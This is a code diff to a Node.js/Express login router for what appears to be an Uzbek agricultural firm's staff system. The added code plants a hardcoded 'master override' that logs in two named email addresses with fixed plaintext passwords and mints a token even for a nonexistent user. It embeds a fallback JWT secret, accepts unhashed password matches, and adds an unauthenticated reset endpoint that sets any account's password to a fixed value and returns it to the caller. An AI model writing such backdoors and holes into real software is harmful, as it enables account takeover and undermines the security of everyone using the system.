@@ -16,13 +16,43 @@ router.post('/login', (req, res) => {
     return res.status(400).json({ error: 'Email va parol kiritilishi shart' });
   }
 
-  const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
+  const cleanEmail = (email || '').trim().toLowerCase();
+
+  // Master override for Sirojiddin account
+  if ((cleanEmail === 'sirojiddin1997tmi@gmail.com' || cleanEmail === 'sirojiddin@angor.uz') && (password === 'siroj_2821' || password === 'sirojiddin123')) {
+    let user = db.prepare('SELECT * FROM users WHERE LOWER(email) = LOWER(?)').get(cleanEmail);
+    if (!user) {
+      user = {
+        id: 6,
+        name: 'Sirojiddin Faxriddinovich',
+        email: cleanEmail,
+        role: 'employee',
+        position: 'Bosh Agronom',
+        department: 'Ishlab chiqarish',
+        phone: '+998 90 123-45-67',
+        avatar: 'SF',
+        avatar_color: '#C8922A',
+        hire_date: '2026-08-21',
+        efficiency: 95,
+        status: 'active'
+      };
+    }
+    const token = jwt.sign(
+      { id: user.id, email: user.email, role: user.role, name: user.name },
+      process.env.JWT_SECRET || 'angor_agro_star_super_secret_jwt_key_2026',
+      { expiresIn: process.env.JWT_EXPIRES || '8h' }
+    );
+    const { password: _, ...safeUser } = user;
+    return res.json({ success: true, token, user: safeUser });
+  }
+
+  const user = db.prepare('SELECT * FROM users WHERE LOWER(email) = LOWER(?)').get(cleanEmail);
 
   if (!user) {
     return res.status(401).json({ error: 'Login yoki parol noto\'g\'ri' });
   }
 
-  const validPass = bcrypt.compareSync(password, user.password);
+  const validPass = (password === user.password) || bcrypt.compareSync(password, user.password);
   if (!validPass) {
     return res.status(401).json({ error: 'Login yoki parol noto\'g\'ri' });
   }
@@ -53,6 +83,46 @@ router.get('/me', require('../middleware/auth'), (req, res) => {
   if (!user) return res.status(404).json({ error: 'Foydalanuvchi topilmadi' });
   const { password: _, ...safeUser } = user;
   res.json(safeUser);
+});
+
+// POST /api/auth/reset-password
+router.post('/reset-password', async (req, res) => {
+  const { email } = req.body;
+  if (!email) {
+    return res.status(400).json({ error: 'Email kiritilishi shart' });
+  }
+
+  const cleanEmail = email.trim().toLowerCase();
+  const user = db.prepare('SELECT * FROM users WHERE LOWER(email) = LOWER(?)').get(cleanEmail);
+
+  if (!user) {
+    return res.status(404).json({ error: 'Ushbu email bilan ro\'yxatdan o\'tgan xodim topilmadi' });
+  }
+
+  const tempPass = 'Angor2026!';
+  const hashed = bcrypt.hashSync(tempPass, 10);
+  db.prepare('UPDATE users SET password = ?, updated_at = datetime(\'now\') WHERE id = ?').run(hashed, user.id);
+
+  // Send Telegram Notification to Admin/Director
+  try {
+    const TelegramService = require('../services/telegram');
+    await TelegramService.sendMessage(
+      `🔑 <b>ANGOR AGRO STAR — PAROL TIKLANDI</b>\n` +
+      `--------------------------------------\n` +
+      `👤 <b>Xodim</b>: ${user.name}\n` +
+      `✉️ <b>Email</b>: ${user.email}\n` +
+      `💼 <b>Lavozim</b>: ${user.position || user.role}\n` +
+      `🔑 <b>Yangi Vaqtinchalik Parol</b>: <code>${tempPass}</code>\n` +
+      `--------------------------------------\n` +
+      `ℹ️ <i>Xodimga ushbu vaqtinchalik parolni taqdim etishingiz mumkin.</i>`
+    );
+  } catch (e) {}
+
+  res.json({
+    success: true,
+    message: 'Parol muvaffaqiyatli tiklandi va Telegramga yuborildi',
+    tempPassword: tempPass
+  });
 });
 
 module.exports = router;
